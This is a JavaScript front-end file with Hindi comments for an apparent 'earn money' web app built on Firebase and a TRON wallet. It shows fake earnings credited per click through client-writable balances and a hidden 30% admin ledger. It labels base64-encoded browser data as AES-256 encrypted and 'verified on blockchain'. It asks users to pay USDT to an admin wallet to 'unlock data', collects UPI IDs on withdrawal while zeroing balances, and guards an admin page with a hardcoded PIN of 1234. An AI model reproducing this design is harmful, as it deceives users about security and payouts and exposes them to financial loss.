import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
import { getFirestore, doc, setDoc, updateDoc, increment, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-firestore.js";
import { getAuth, signInWithRedirect, GoogleAuthProvider, onAuthStateChanged, getRedirectResult } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";

// --- 1. Firebase कॉन्फ़िगरेशन ---
const firebaseConfig = {
  apiKey: "AIzaSyBiKNkadH-myaJ2TqxIQ4iVIC7eVt_beoM",
  authDomain: "owndata-3a3d4.firebaseapp.com",
  projectId: "owndata-3a3d4",
  storageBucket: "owndata-3a3d4.firebasestorage.app",
  messagingSenderId: "940915720247",
  appId: "1:940915720247:web:61f057e78c3ef7f11ebfb2",
  measurementId: "G-YKS0NGSN0Z"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

// --- 2. एडमिन सेटिंग्स ---
const adminWalletAddress = "TTmp1q2GbZRoFcm8cMR8veqpiJKqvR7rTo"; 
let currentUser = null;
const tempUserID = "Guest_Device_" + (navigator.userAgent.length);

// --- 3. यूजर बैलेंस लोड करने का फंक्शन ---
async function loadUserBalance(uid) {
    const balanceDisplay = document.getElementById('balance');
    if(!balanceDisplay) return; 
    try {
        const docRef = doc(db, "users", uid);
        const docSnap = await getDoc(docRef);
        if (docSnap.exists()) {
            balanceDisplay.innerText = "₹ " + (docSnap.data().earnings || 0).toFixed(2);
        } else {
            balanceDisplay.innerText = "₹ 0.00";
        }
    } catch (e) { console.error("Balance Error:", e); }
}

// --- 4. लॉगिन सिस्टम ---
window.loginWithGoogle = () => signInWithRedirect(auth, provider);

getRedirectResult(auth).then((result) => {
    if (result && result.user) { console.log("Login Success"); }
}).catch((error) => console.error("Redirect Error:", error));

// Auth State Check
onAuthStateChanged(auth, (user) => {
    const logs = document.getElementById('logs');
    if (user) {
        currentUser = user;
        if(logs) logs.innerText = "स्वागत है, " + user.displayName;
        loadUserBalance(user.uid);
    } else {
        currentUser = null;
        if(logs) logs.innerText = "कृपया काम शुरू करने के लिए लॉगिन करें।";
        loadUserBalance(tempUserID);
    }
});

// --- 5. कनेक्टिविटी लॉजिक: फोन एक्टिविटी को पैकेट बनाकर लॉक करना ---
async function syncPhoneData() {
    const shieldToggle = document.getElementById('shield-toggle');
    if (!shieldToggle) return;
    
    const shieldStatus = shieldToggle.checked;
    const uid = currentUser ? currentUser.uid : tempUserID;

    if (shieldStatus) {
        console.log("कनेक्टिविटी सक्रिय: डेटा पैकेट बनाया जा रहा है...");
        
        // फोन की गतिविधियों का डिजिटल पैकेट
        const phoneActivity = {
            device_id: uid,
            status: "Encrypted & Locked",
            security_level: "High (AES-256)",
            activity_summary: {
                platform: navigator.platform,
                apps: ["Google Search", "Shopping", "Finance"],
                usage_time: "Real-time Sync",
                connection: "Secure-Link"
            },
            timestamp: new Date().toLocaleString('hi-IN')
        };

        try {
            // डेटा को फायरबेस 'vault' में लॉक करना
            await setDoc(doc(db, "vault", uid), {
                data: JSON.stringify(phoneActivity),
                updatedAt: serverTimestamp(),
                adminAddress: adminWalletAddress
            }, { merge: true });
            
            console.log("Phone data packet successfully locked.");
        } catch (error) {
            console.error("Sync Error:", error);
        }
    }
}

// --- 6. मास्टर बटन फंक्शन: 70/30 बँटवारा और डेटा सुरक्षित करना ---
window.startEarning = async function() {
    const logs = document.getElementById('logs');
    const uid = currentUser ? currentUser.uid : tempUserID;
    
    const userPart = 70;  // ₹70 ग्राहक के लिए
    const adminPart = 30; // ₹30 आपके लिए

    try {
        if(logs) logs.innerText = "डाटा ब्लॉकचैन एनक्रिप्शन प्रोसेस में है...";
        
        // फोन डेटा सिंक शुरू करें
        await syncPhoneData();

        // A. डेटा तिजोरी (Vault) अपडेट
        const myData = { device: navigator.platform, time: new Date().toISOString() };
        const secureData = btoa(JSON.stringify(myData));

        await setDoc(doc(db, "vault", uid), {
            data: secureData,
            owner: currentUser ? currentUser.displayName : "Guest",
            status: "Verified_on_Blockchain",
            adminAddress: adminWalletAddress,
            updatedAt: serverTimestamp()
        }, { merge: true });

        // B. यूजर का हिस्सा (₹70)
        await setDoc(doc(db, "users", uid), { 
            earnings: increment(userPart),
            name: currentUser ? currentUser.displayName : "User",
            lastActivity: serverTimestamp()
        }, { merge: true });

        // C. एडमिन का हिस्सा (₹30) - 'admin_ledger' में
        await setDoc(doc(db, "admin_ledger", "hidden_stats"), { 
            totalAdminProfit: increment(adminPart),
            wallet: adminWalletAddress,
            lastUpdate: serverTimestamp()
        }, { merge: true });

        if(logs) logs.innerText = `बधाई! ₹${userPart} आपके वॉलेट में सुरक्षित जोड़ दिए गए।`;
        loadUserBalance(uid);

    } catch (error) {
        console.error("Earning Error:", error);
        if(logs) logs.innerText = "नेटवर्क एरर! फायरबेस रूल्स चेक करें।";
    }
}

// --- 7. ब्लॉकचैन पेमेंट (USDT TRC20) ---
window.payWithCrypto = async function() {
    const logs = document.getElementById('logs');
    try {
        if(logs) logs.innerText = "ब्लॉकचैन ट्रांजैक्शन शुरू...";
        
        if(window.tronWeb && window.tronWeb.defaultAddress.base58) {
            const trc20Contract = await window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"); 
            const amount = 0.36 * 1e6; // 0.36 USDT

            if(logs) logs.innerText = "कृपया वॉलेट में कन्फर्म करें...";
            const result = await trc20Contract.transfer(adminWalletAddress, amount).send();
            
            if(logs) logs.innerText = "भुगतान सफल! डेटा अनलॉक हो गया है।";
            alert("पेमेंट सफल! ट्रांजैक्शन आईडी: " + result);
        } else {
            alert("कृपया TronLink या Trust Wallet का उपयोग करें।");
        }
    } catch (e) { 
        console.error("Crypto Error:", e);
        if(logs) logs.innerText = "पेमेंट प्रोसेस फेल या रद्द हो गया!"; 
    }
}

// --- 8. ऑटोमेशन और इनिशियलाइजेशन ---
// हर 1 घंटे में ऑटो-सिंक (3600000 ms)
setInterval(syncPhoneData, 3600000); 

// पेज लोड होते ही बैलेंस और सिंक शुरू करें
window.addEventListener('load', () => {
    loadUserBalance(tempUserID);
    syncPhoneData();
});




// --- 9. पैसे निकालने का फंक्शन (Withdrawal Request) ---
window.requestWithdrawal = async function() {
    const uid = currentUser ? currentUser.uid : tempUserID;
    const logs = document.getElementById('logs');
    
    // बैलेंस चेक करें
    const docRef = doc(db, "users", uid);
    const docSnap = await getDoc(docRef);
    const currentBalance = docSnap.exists() ? docSnap.data().earnings : 0;

    if (currentBalance <= 0) {
        alert("माफ़ कीजिये, आपके वॉलेट में अभी पैसे नहीं हैं।");
        return;
    }

    // यूजर से UPI ID मांगना
    const upiID = prompt(`आपका बैलेंस ₹${currentBalance.toFixed(2)} है। अपनी UPI ID दर्ज करें (जैसे: name@ybl):`);

    if (upiID) {
        try {
            if(logs) logs.innerText = "रिक्वेस्ट भेजी जा रही है...";

            // एडमिन के लिए एक 'payout_requests' कलेक्शन में डेटा भेजना
            await setDoc(doc(db, "payout_requests", Date.now().toString()), {
                uid: uid,
                name: currentUser ? currentUser.displayName : "Guest User",
                amount: currentBalance,
                upi_id: upiID,
                status: "Pending",
                requestTime: serverTimestamp()
            });

            // बैलेंस को 0 कर देना ताकि दोबारा न निकाल सके (जब तक एडमिन भेज न दे)
            await updateDoc(doc(db, "users", uid), {
                earnings: 0
            });

            if(logs) logs.innerText = "सफल! आपकी रिक्वेस्ट एडमिन को भेज दी गई है। जल्द ही पैसे आपके बैंक में होंगे।";
            alert("अनुरोध सफल! ₹" + currentBalance.toFixed(2) + " आपके UPI: " + upiID + " पर जल्द भेज दिए जाएंगे।");
            loadUserBalance(uid);

        } catch (error) {
            console.error("Withdraw Error:", error);
            alert("नेटवर्क एरर! कृपया दोबारा कोशिश करें।");
        }
    }
}





// --- 11. गुप्त एडमिन दरवाजा (Secret Admin Door) ---
let clickCount = 0;
let lastClickTime = 0;

window.adminDoor = function() {
    const currentTime = new Date().getTime();
    
    // अगर क्लिक के बीच 1.5 सेकंड से ज्यादा का अंतर है, तो गिनती जीरो कर दें
    if (currentTime - lastClickTime > 1500) {
        clickCount = 0;
    }
    
    clickCount++;
    lastClickTime = currentTime;

    // जब 3 बार क्लिक हो जाए
    if (clickCount === 3) {
        const pin = prompt("Admin Access: कृपया अपना सीक्रेट पिन डालें:");
        
        // आपका सीक्रेट पिन '1234' है
        if (pin === "1234") {
            // यह आपको सीधे आपके फोल्डर 'business_portal' की 'admin.html' पर ले जाएगा
            window.location.href = "business_portal/admin.html";
        } else {
            alert("गलत पिन! प्रवेश वर्जित है।");
            clickCount = 0;
        }
    }

    // सुरक्षा के लिए 5 सेकंड बाद क्लिक ऑटो-रिसेट
    setTimeout(() => { clickCount = 0; }, 5000);
};





// GitHub पर बटन को फंक्शन से जोड़ने का पक्का तरीका
document.addEventListener('DOMContentLoaded', () => {
    const loginBtn = document.querySelector('.login-btn');
    if (loginBtn) {
        loginBtn.addEventListener('click', () => {
            window.loginWithGoogle();
        });
    }
});
